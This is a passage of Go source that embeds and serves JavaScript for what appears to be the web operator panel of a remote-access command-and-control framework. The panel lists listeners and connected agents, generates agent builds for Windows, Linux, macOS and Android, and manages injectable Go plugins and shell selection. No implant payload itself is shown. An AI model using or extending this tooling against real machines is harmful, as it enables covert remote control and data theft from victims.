                    "Content-Type": "application/json",
                },
                body: JSON.stringify(jsonData),
            });
            if (!res.ok) {
                const errorText = await res.text();
                alert("HTTP error!: " + errorText);
            }
        } catch (err) {
        }
    }
    async get_server() {
        // 只绑定一次 click 事件
        this.initServerIndexClickHandler();

        setInterval(async () => {
            try {
                let interval_server = this.server + "/user_index?op=ServerIndex&clientsCount=" + this.server_data.length;
                const response = await fetch(interval_server);
                if (!response.ok && response.status === 400) {
                    const errorText = await response.text();
                    console.error('Error:', errorText);
                    return;
                }
                if (response.ok && response.headers.get('Content-Type')?.includes('application/json')) {
                    const data = await response.json();
                    if (data !== 'noNeeded' && Array.isArray(data) && data.length > 0) {
                        this.server_data = data;
                        this.updateServerIndex();
                    }
                }
            } catch (error) {
                console.error('Request failed', error);
            }
        }, 15000);
    }

    updateServerIndex() {
        const serverIndexDiv = document.getElementById('server_index');
        if (!serverIndexDiv) return;
        let htmlContent = "";
        for (const server of this.server_data) {
            const key_path = server.keyPath.length > 10 ? server.keyPath.substring(0, 10) + "..." : server.keyPath;
            const cert_path = server.certPath.length > 10 ? server.certPath.substring(0, 10) + "..." : server.certPath;
            htmlContent += "<div id='" + server.port + "-info' class='server-info' style='border:1px solid #ccc;padding:10px;margin-bottom:10px;border-radius:6px;background-color:#f9f9f9;'>";
                htmlContent += "<div class='server-container' style='margin-bottom:6px;font-family:monospace;color:#333;font-size:14px;'>";
                htmlContent += "[<strong class='ip-address' style='color:#007BFF;'>port:</strong> " + server.port + "] ";
                htmlContent += "[<strong class='ip-address' style='color:#007BFF;'>protocol:</strong> " + server.protocol + "] ";
                htmlContent += "[<strong class='ip-address' style='color:#007BFF;'>cert:</strong> " + cert_path + "] ";
                htmlContent += "[<strong class='ip-address' style='color:#007BFF;'>key:</strong> " + key_path + "] ";
                htmlContent += "[<strong class='ip-address' style='color:#007BFF;'>user:</strong> " + server.user + "] ";
                htmlContent += "[<strong class='ip-address' style='color:#007BFF;'>path:</strong> " + server.path + "] ";
                htmlContent += "[<strong class='ip-address' style='color:#007BFF;'>remark:</strong> " + server.remark + "] ";
                htmlContent += "[<strong class='ip-address' style='color:#007BFF;'>agents:</strong> <strong class='ip-address' id='" + server.port + "' style='color:#DC3545;'>0</strong>] ";
                htmlContent += "</div>";
                htmlContent += "<div style='display:flex;flex-wrap:wrap;gap:8px;'>";
                if (server.windows_pro === "group_pro") {
                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Win_agent}</a>";
                } else {
                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Win_agent}</a>";
                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='linux' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Linux_agent}</a>";
                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='macos' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{MacOS_agent}</a>";
                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='android' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Android_agent}</a>";
                }
                htmlContent += "<a class='ip-address download-config' href='javascript:void(0)' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Download Config}</a>";
                htmlContent += "<a class='ip-address plugin' href='javascript:void(0)' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{plugin}</a>";
                htmlContent += "<a class='ip-address delete-server' href='javascript:void(0)' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Delete}</a>";
                htmlContent += "</div>";
            htmlContent += "</div>";
        }
        serverIndexDiv.innerHTML = htmlContent;
    }

    initServerIndexClickHandler() {
        const serverIndexDiv = document.getElementById('server_index');
        if (!serverIndexDiv) return;

        serverIndexDiv.addEventListener('click', (event) => {
            const target = event.target;

            if (target.classList.contains('delete-server')) {
                const port = target.getAttribute('data-port');
                this.server_data = this.server_data.filter(s => s.port !== port);
                fetch(this.server + "/user_index?op=delserver&port=" + port)
                    .then(res => res.text())
                    .then(data => {
                        if (data === "[!] This server has agents,can not stop\n") {
                            alert(data);
                            return;
                        }
                        const serverDiv = document.getElementById(port + "-info");
                        if (serverDiv) serverDiv.remove();
                    });
            }

            if (target.classList.contains('download-config')) {
                const port = target.getAttribute('data-port');
                this.downloadConfig(port);
            }

            if (target.classList.contains('agent-link')) {
                const os = target.getAttribute('data-os');
                const port = target.getAttribute('data-port');
                const server = this.server_data.find(s => s.port === port);
                if (!server) return;

                const path = server.path.replace(/^\//, "");
                fetch(this.server + "/user_index?op=getPlugin&remark=" + server.remark + "&os=" + os)
                    .then(res => res.json())
                    .then(pluginData => {
                        const code = pluginData?.code?.join("\n") || "/*code*/";
                        this.redirectToAgentCode(
                            os, port, server.protocol, path,
                            server.conn_path, server.msg_path, server.switch_path, server.encry_path,
                            server.download_path, server.result_path, server.net_path, server.info_path,
                            server.upload_path, server.list_path, server.option_path,
                            server.user, server.uid, server.hostname, server.keyPart,
                            server.filekey, code,server.windows_pro
                        );
                    });
            }

            if (target.classList.contains('plugin')) {
                const port = target.getAttribute('data-port');
                const server = this.server_data.find(s => s.port === port);
                if (!server) return;

                let dialog = document.getElementById("serverDialog");
                if (!dialog) {
                    dialog = document.createElement("div");
                    dialog.id = "serverDialog";
                    dialog.className = "serverDialog";
                    dialog.style.left = "50%";
                    dialog.style.display = "block";
                    dialog.dataset.remark = server.remark;

                    dialog.innerHTML =
                        "<h3>plugin</h3>" +
                        "<form id='pluginForm' method='POST'>" +
                        "<select id='select_os'>" +
                            "<option value='win'>windows</option>" +
                            "<option value='linux'>linux</option>" +
                            "<option value='macos'>macos</option>" +
                            "<option value='android'>android</option>" +
                        "</select><br>" +
                        "<input name='codeWord' placeholder='codeWord'><br>" +
                        "<div id='parameterContainer'>" +
                            "<span>Parameter count: <span id='parameterCount'>1</span></span>" +
                            "<button type='button' id='addParameterBtn'>+</button>" +
                            "<button type='button' id='removeParameterBtn'>-</button>" +
                            "<input type='hidden' name='parameter' id='parameterHidden' value='1' />" +
                        "</div>" +
                        "<input name='code' placeholder='golang language.msg-1,msg-2,msg-3 for parameter'><br>" +
                        "<input id='parameterDec' name='parameterDec' placeholder='Meaning of parameter'><br>" +
                        "<button type='button' id='submitBtn' onclick=\"plugin('" + server.remark + "')\">plugin</button>" +
                        "<button type='button' onclick='closeStartServerDialog()'>close</button>" +
                        "</form>" +
                        "<div id='plugin_list' class='plugin_list'></div>";

                    document.getElementById("server_index").appendChild(dialog);
                    requestAnimationFrame(() => {
                        dialog.style.transform = "translateX(-50%) scaleY(1)";
                        dialog.style.opacity = "1";
                    });

                    // 绑定参数加减按钮事件（首次创建时）
                    const addBtn = dialog.querySelector('#addParameterBtn');
                    const removeBtn = dialog.querySelector('#removeParameterBtn');
                    const countDisplay = dialog.querySelector('#parameterCount');
                    const countHidden = dialog.querySelector('#parameterHidden');

                    if (addBtn && removeBtn && countDisplay && countHidden) {
                        addBtn.onclick = () => {
                            let count = parseInt(countHidden.value);
                            if (count < 20) {
                                count++;
                                countHidden.value = count;
                                countDisplay.textContent = count;
                            }
                        };
                        removeBtn.onclick = () => {
                            let count = parseInt(countHidden.value);
                            if (count > 1) {
                                count--;
                                countHidden.value = count;
                                countDisplay.textContent = count;
                            }
                        };
                    }

                    this.refreshPluginList(server.remark);
                } else {
                    dialog.style.display = "block";
                    dialog.style.transform = "translateX(-50%) scaleY(1)";
                    dialog.style.opacity = "1";
                    if (dialog.dataset.remark !== server.remark) {
                        dialog.dataset.remark = server.remark;
                        this.refreshPluginList(server.remark);
                    }
                }
            }
        });
    }

    refreshPluginList(remark) {
        var pluginList = document.getElementById("plugin_list");
        if (!pluginList) return;

        var os_list = ['win', 'linux', 'macos', 'android'];

        os_list.forEach(function(os) {
            // 每个平台一个独立容器
            var sectionId = "plugin_section_" + os;
            var section = document.getElementById(sectionId);
            if (!section) {
                section = document.createElement("div");
                section.id = sectionId;
                pluginList.appendChild(section);
            }
            section.innerHTML = "";  // 只清空当前平台的内容

            fetch(this.server + "/user_index?op=getPlugin&remark=" + remark + "&os=" + os)
                .then(function(response) { return response.json(); })
                .then(function(pluginData) {
                    if (pluginData && pluginData.code && Array.isArray(pluginData.code) && pluginData.code.length > 0) {
                        var codes = pluginData.code;

                        var osTitle = document.createElement("h3");
                        osTitle.textContent = os;
                        section.appendChild(osTitle);

                        codes.forEach(function(codeStr, idx) {
                            if (codeStr === "/*code*/") return;

                            var pluginItem = document.createElement("div");
                            pluginItem.className = "plugin-item";
                            pluginItem.style.display = "flex";
                            pluginItem.style.justifyContent = "space-between";
                            pluginItem.style.alignItems = "center";
                            pluginItem.style.gap = "8px";

                            var shortText = codeStr.length > 20 ? codeStr.slice(0, 20) + "…" : codeStr;
                            var expanded = false;
                            var span = document.createElement("span");
                            span.textContent = shortText;
                            span.style.cursor = "pointer";
                            span.style.whiteSpace = "pre-wrap";
                            span.onclick = function () {
                                expanded = !expanded;
                                span.textContent = expanded ? codeStr : shortText;
                            };

                            var btnGroup = document.createElement("div");
                            btnGroup.style.display = "flex";
                            btnGroup.style.gap = "4px";

                            var deleteBtn = document.createElement("button");
                            deleteBtn.textContent = "🗑";
                            deleteBtn.title = "删除插件";
                            deleteBtn.onclick = function () {
                                fetch("/user_index?op=delPlugin&remark=" + remark + "&os=" + os + "&index=" + idx)
                                    .then(function() {
                                        pluginItem.remove();
                                    }).catch(function(error) {
                                        console.error("删除插件失败:", error);
                                    });
                            }.bind(this);

                            var copyBtn = document.createElement("button");
                            copyBtn.textContent = "📋";
                            copyBtn.title = "复制代码";
                            copyBtn.onclick = function () {
                                navigator.clipboard.writeText(codeStr).then(function () {
                                    copyBtn.textContent = "✅";
                                    setTimeout(function () {
                                        copyBtn.textContent = "📋";
                                    }, 1000);
                                }).catch(console.error);
                            };

                            btnGroup.appendChild(copyBtn);
                            btnGroup.appendChild(deleteBtn);
                            pluginItem.appendChild(span);
                            pluginItem.appendChild(btnGroup);
                            section.appendChild(pluginItem);
                        });
                    } else {
                        var emptyItem = document.createElement("div");
                        emptyItem.className = "plugin-item";
                        emptyItem.style.display = "flex";
                        emptyItem.style.justifyContent = "space-between";
                        emptyItem.style.alignItems = "center";
                        emptyItem.style.gap = "8px";
                        emptyItem.innerHTML = "<span><strong>" + os + ":</strong> No plugin available</span>";
                        section.appendChild(emptyItem);
                    }
                }.bind(this)).catch(function(err) {
                    console.error("获取插件失败:", err);
                });
        }.bind(this));
    }

    // 下载配置
    downloadConfig(port) {
        // 根据 port 找到对应的 server
        const server = this.server_data.find(server => server.port === port);
        if (!server) {
            alert("未找到服务器配置！");
            return;
        }
    
        // 转换为 JSON 字符串
        const configData = JSON.stringify(server, null, 4);
    
        // 创建 Blob 对象
        const blob = new Blob([configData], { type: "application/json" });
        const url = URL.createObjectURL(blob);
    
        // 创建下载链接
        const a = document.createElement("a");
        a.href = url;
        a.download = "server_config_" + port + ".json";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
    
        // 释放 URL
        URL.revokeObjectURL(url);
    }
    
    
    redirectToAgentCode(os, port, protocol, path, connPath, msgPath, switch_key, encry_key, download, result, net, info, upload, list, option, user,uid, hostname, keyPart, filekey,code, windows_pro) {
        const master = window.location.hostname + ":" + port;
    
        let queryParams = "os=" + encodeURIComponent(os) +
            "&server=" + encodeURIComponent(master) +
            "&Path=" + encodeURIComponent(path) +
            "&ConnPath=" + encodeURIComponent(connPath) +
            "&MsgPath=" + encodeURIComponent(msgPath) +
            "&switch_key=" + encodeURIComponent(switch_key) +
            "&encry_key=" + encodeURIComponent(encry_key) +
            "&download=" + encodeURIComponent(download) +
            "&result=" + encodeURIComponent(result) +
            "&net=" + encodeURIComponent(net) +
            "&info=" + encodeURIComponent(info) +
            "&upload=" + encodeURIComponent(upload) +
            "&list=" + encodeURIComponent(list) +
            "&option=" + encodeURIComponent(option) +
            "&username=" + this.username+
            "&user=" + encodeURIComponent(user) +
            "&uid=" + encodeURIComponent(uid) +
            "&hostname=" + encodeURIComponent(hostname) +
            "&keyPart=" + encodeURIComponent(keyPart) +
            "&filekey=" + encodeURIComponent(filekey)+
            "&code=" + encodeURIComponent(code);
        if (windows_pro) {
            queryParams += "&group_pro=" + encodeURIComponent(windows_pro);
        }
    
        const url = this.server + "/user_index?op=agentcode&protocol=" + encodeURIComponent(protocol) + "&" + queryParams;
        window.location.href = url;
    }
    
    

    checkTime() {
        let check_url = this.server + "/user_index?op=checkclient";
        setInterval(() => {
            fetch(check_url)
                .then(response => {
                    if (response.ok && response.headers.get('Content-Type').includes('application/json')) {
                        return response.json();
                    } else {
                        throw new Error("Invalid JSON response");
                    }
                })
                .then(data => {
                    data.forEach(item => {
                        let clientid = document.getElementById(item.port);
                        if(clientid){
                            clientid.innerHTML = item.client;
                        }
                    });
                })
                .catch(error => {
                    console.error("Error fetching data:", error);
                });
        }, 5000);
    }
}

function net_init(shell_list) {
    try {
        const selectElement = document.getElementById('net_shell');
        selectElement.innerHTML = '<option value="">Select</option>';
        shell_list.forEach(item => {
            const option = document.createElement('option');
            option.value = item.uid; // UID
            option.textContent = item.host;
            selectElement.appendChild(option);
        });
    } catch (error) {
        console.error("error:", error);
    }
}
function toggleInfo(uid,op) {
    console.log(uid,op)
    if(op == "info"){
        var infoContent = document.getElementById(uid+"-info-content");
    }else if(op == "choose"){
        var infoContent = document.getElementById(uid+"-choose-content");
    }
    infoContent.classList.toggle("show");
}

// 打开 iframe
function openIframe(url) {
    var iframePanel = document.getElementById('iframePanel');
    var iframe = document.getElementById('iframe');
    iframe.src = url;
    iframePanel.style.display = 'block';
}

// 关闭 iframe
function closeIframe() {
    var iframePanel = document.getElementById('iframePanel');
    iframePanel.style.display = 'none';
}
// 切换侧边栏
function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    const button = document.querySelector('.toggle-button');
    const log = document.getElementById('log');
    const serverIndexDiv = document.querySelector(".server_index");
    const contentDiv = serverIndexDiv.querySelector(".content");
    sidebar.classList.toggle('shrink');
    if (sidebar.classList.contains('shrink')) {
        button.textContent = '>';
        log.style.left = '50px';
        log.style.width = 'calc(100% - 50px)';
        contentDiv.style.width = 'calc(100% - 50px)';
    } else {
        button.textContent = '<';
        log.style.left = '180px';
        log.style.width = 'calc(100% - 180px)';
        contentDiv.style.width = 'calc(100% - 180px)';
    }
}

// 窗口调整大小
document.addEventListener("DOMContentLoaded", function () {
    // **只调整 .server_index > .content 和 #log 的高度**
    const logDiv = document.getElementById("log");
    const logContent = document.getElementById("log-content");
    const logHandle = logDiv.querySelector(".resize-handle");
    const serverIndexDiv = document.querySelector(".server_index");
    const contentDiv = serverIndexDiv.querySelector(".content");
    let isResizingLog = false, startY, startContentHeight, startLogHeight, totalHeight;

    function startResize(e) {
        isResizingLog = true;
        startY = e.touches ? e.touches[0].clientY : e.clientY;
        startContentHeight = contentDiv.offsetHeight;
        startLogHeight = logDiv.offsetHeight;
        totalHeight = serverIndexDiv.offsetHeight;
        document.addEventListener("mousemove", resizeLog);
        document.addEventListener("mouseup", stopResize);
        document.addEventListener("touchmove", resizeLog);
        document.addEventListener("touchend", stopResize);
    }

    function resizeLog(e) {
        if (!isResizingLog) return;
        let currentY = e.touches ? e.touches[0].clientY : e.clientY;
        let deltaY = startY - currentY;
        let newContentHeight = Math.max(60, startContentHeight - deltaY);
        let minLogHeight = 20;
        let maxContentHeight = totalHeight - minLogHeight;
        if (newContentHeight > maxContentHeight) newContentHeight = maxContentHeight;
        contentDiv.style.height = newContentHeight + "px";
        logDiv.style.height = (totalHeight - newContentHeight) + "px";
    }

    function stopResize() {
        isResizingLog = false;
        document.removeEventListener("mousemove", resizeLog);
        document.removeEventListener("mouseup", stopResize);
        document.removeEventListener("touchmove", resizeLog);
        document.removeEventListener("touchend", stopResize);
    }

    // 初始化高度自适应
    function setInitialHeights() {
        const total = serverIndexDiv.offsetHeight;
        const contentH = Math.floor(total * 0.8);
        const logH = total - contentH;
        contentDiv.style.height = contentH + "px";
        logDiv.style.height = logH + "px";
    }
    setInitialHeights();
    window.addEventListener('resize', setInitialHeights);

    logHandle.addEventListener("mousedown", startResize);
    logHandle.addEventListener("touchstart", startResize);

    // **自动更新日志内容**
    setInterval(function () {
        var server = window.location.protocol + "//" + window.location.host;
        var url = server + "/user_index?op=logRead&pos=50";
        fetch(url)
            .then(function (response) { return response.json(); })
            .then(function (data) {
                var html = "";
                for (var i = 0; i < data.length; i++) {
                    var entry = data[i];
                    html += "[" + entry.time + "]   :   " + entry.message + "\n";
                }
                document.getElementById("log-content").innerText = html;
            })
            .catch(function (err) {
                console.error("read log error:", err);
            });
    }, 1000);

    // **iframe 拖动**
    const iframePanel = document.getElementById("iframePanel");
    const dragHandle = iframePanel.querySelector(".drag-handle");
    let isDragging = false, offsetX, offsetY;

    function startDrag(e) {
        isDragging = true;
        offsetX = (e.touches ? e.touches[0].clientX : e.clientX) - iframePanel.offsetLeft;
        offsetY = (e.touches ? e.touches[0].clientY : e.clientY) - iframePanel.offsetTop;
        document.addEventListener("mousemove", dragMove);
        document.addEventListener("mouseup", stopDrag);
        document.addEventListener("touchmove", dragMove);
        document.addEventListener("touchend", stopDrag);
    }

    function dragMove(e) {
        if (!isDragging) return;
        let newX = (e.touches ? e.touches[0].clientX : e.clientX) - offsetX;
        let newY = (e.touches ? e.touches[0].clientY : e.clientY) - offsetY;
        const pageWidth = window.innerWidth, pageHeight = window.innerHeight;
        const panelWidth = iframePanel.offsetWidth, panelHeight = iframePanel.offsetHeight;
        if (newX < 0) newX = 0;
        else if (newX + panelWidth > pageWidth) newX = pageWidth - panelWidth;
        if (newY < 0) newY = 0;
        else if (newY + panelHeight > pageHeight) newY = pageHeight - panelHeight;
        iframePanel.style.left = newX + "px";
        iframePanel.style.top = newY + "px";
    }

    function stopDrag() {
        isDragging = false;
        document.removeEventListener("mousemove", dragMove);
        document.removeEventListener("mouseup", stopDrag);
        document.removeEventListener("touchmove", dragMove);
        document.removeEventListener("touchend", stopDrag);
    }

    dragHandle.addEventListener("mousedown", startDrag);
    dragHandle.addEventListener("touchstart", startDrag);

    // **侧边栏导航**
    const links = document.querySelectorAll(".sidebar a, .tle-sidebar a");
    const sections = document.querySelectorAll(".content > div");

    function showSection(targetId) {
        sections.forEach(section => {
            section.classList.toggle("hidden", section.id !== targetId);
        });
    }

    links.forEach(link => {
        link.addEventListener("click", function (e) {
            e.preventDefault();
            showSection(this.getAttribute("data-target"));
        });
        link.addEventListener("touchstart", function (e) {
            e.preventDefault();
            showSection(this.getAttribute("data-target"));
        });
    });

    // **默认选中第一个**
    if (links.length > 0) {
        showSection(links[0].getAttribute("data-target"));
    }
});

document.addEventListener('DOMContentLoaded', function () {
    // 选择电脑端和手机端的侧边栏
    const links = document.querySelectorAll('.sidebar a, .tle-sidebar a');
    const sections = document.querySelectorAll('.content > div');
    // 为每个链接添加点击事件
    links.forEach(link => {
        link.addEventListener('click', function (e) {
            e.preventDefault();
            const targetId = this.getAttribute('data-target');
            sections.forEach(section => {
                if (section.id === targetId) {
                    section.classList.remove('hidden');
                } else {
                    section.classList.add('hidden');
                }
            });
        });
    });
    // 侧边栏显示/隐藏按钮事件
    document.getElementById("tel-toggleBtn").addEventListener("click", function() {
        const sidebar = document.getElementById("tle-sidebar");
        if (sidebar.style.display === "none" || sidebar.style.display === "") {
            sidebar.style.display = "block";
            this.textContent = "🔽";
        } else {
            sidebar.style.display = "none";
            this.textContent = "📋";
        }
    });
});
`

			w.Header().Set("Content-Type", "text/javascript")
			fmt.Fprint(w, html)
			return
		}
	}
}